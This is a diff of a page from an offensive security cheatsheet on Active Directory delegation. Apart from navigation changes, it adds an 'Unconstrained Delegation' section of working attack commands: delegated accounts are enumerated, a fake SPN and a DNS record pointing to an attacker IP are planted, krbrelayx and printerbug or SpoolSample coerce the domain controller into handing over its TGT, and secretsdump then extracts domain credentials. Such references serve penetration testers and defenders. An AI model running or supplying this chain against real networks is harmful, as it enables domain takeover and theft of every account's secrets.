@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-05-12T14:20:27 CEST">
+<meta name="revised" content="2020-06-16T13:58:58 CEST">
 <title>Active Directory Delegations :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1337,6 +1337,13 @@
       <a href="/linux-systems/">Linux Systems</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
+      <li data-nav-id="/linux-systems/tricks/" class="dd-item">
+        <div>
+          <a href="/linux-systems/tricks/">
+            Global Tricks (sysadmin)
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
       <li data-nav-id="/linux-systems/recon_enumeration/" class="dd-item">
         <div>
           <a href="/linux-systems/recon_enumeration/">
@@ -1730,6 +1737,54 @@
     
     
     
+
+<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nice resource for user account =/= machine account in UC</span>
+http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
+
+<span style="color:#75715e"># AD Objects having Unconstrained Delegation issues have the TRUSTED_FOR_DELEGATION flag set</span>
+
+<span style="color:#75715e"># You can search for users using Pywerview</span>
+$ python pywerview.py get-netuser -u ownedUser -p userPassword -d foo.lan -t dc1.foo.lan --unconstrained
+
+<span style="color:#75715e"># You can also request through ldapdomain dump and then grep for interesting</span>
+$ ldapdomaindump -u <span style="color:#d88200">&#34;foo.lan\\ownedUser&#34;</span> -p <span style="color:#d88200">&#34;userPassword&#34;</span> <span style="color:#ae81ff">192</span>.168.30.10
+$ grep TRUSTED_FOR_DELEGATION *.grep
+
+<span style="color:#75715e"># Using Powershell and the ADModule (https://github.com/samratashok/ADModule)</span>
+Get-ADComputer -Filter <span style="color:#f92672">{</span>TrustedForDelegation -eq <span style="color:#111">$True</span><span style="color:#f92672">}</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Compromised User having Unconstrained Delegation</span>
+
+<span style="color:#75715e"># 1/ Add a fake SPN using the pwnedUser</span>
+$ python addspn.py -u foo.lan<span style="color:#8045ff">\\</span>ownedUser -p userPassword -s host/PWNED.foo.lan ldap://dc1.foo.lan
+
+<span style="color:#75715e"># 2/ Create a new DNS record pointing the fake SPN to our attacking IP</span>
+$ python dnstool.py -u foo.lan<span style="color:#8045ff">\\</span>ownedUser -p userPassword -r PWNED.foo.lan -a add -d &lt;attacker-IP&gt; DC1.foo.lan
+
+<span style="color:#75715e"># 3/ In one shell, start krbrelayx (salt is case sensitive!)</span>
+$ sudo python krbrelayx.py --krbsalt foo.lanownedUser --krbpass userPassword
+
+<span style="color:#75715e"># 4/ In another shell</span>
+$ python printerbug.py foo.lan/ownedUser:userPassword@DC1.foo.lan PWNED.foo.lan
+
+<span style="color:#75715e"># It will force the target DC to connect to our fake new &#34;computer&#34; configured through</span>
+<span style="color:#75715e"># Unconstrained Delegation. It will then embed a copy of the DC$ TGT, being saved by krbrelayx.</span>
+
+<span style="color:#75715e"># Then...</span>
+<span style="color:#111">export</span> <span style="color:#111">KRB5CCNAME</span><span style="color:#f92672">=</span>/path/to/ticket.ccache
+$ python secretsdump.py -k DC1.foo.lan -just-dc     </code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Compromised Machine/Server having Unconstrained Delegation</span>
+
+<span style="color:#75715e"># If you compromised a machine having UC you can use it to get a copy of the DC&#39;s TGT</span>
+<span style="color:#75715e"># In Powershell you can check for the spoolss presence</span>
+PS&gt; ls <span style="color:#8045ff">\\</span>&lt;dc-ip&gt;<span style="color:#8045ff">\p</span>ipe<span style="color:#8045ff">\s</span>poolss
+
+<span style="color:#75715e"># On the compromised machine, start monitoring with Rubeus</span>
+Rubeus.exe monitor /interval:1 
+
+<span style="color:#75715e"># Then using the SpoolSample PoC (https://github.com/leechristensen/SpoolSample)</span>
+<span style="color:#75715e"># You can force the DC to connect to the owned machine</span>
+<span style="color:#75715e"># Delegation being set, you will get a copy of the DC$ TGT in Rubeus</span>
+.<span style="color:#8045ff">\S</span>poolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME</code></pre></div>
+<p><br/></p>
 
 <h3 id="rbcd-exploitation">RBCD Exploitation</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/aas-n/leHACK19
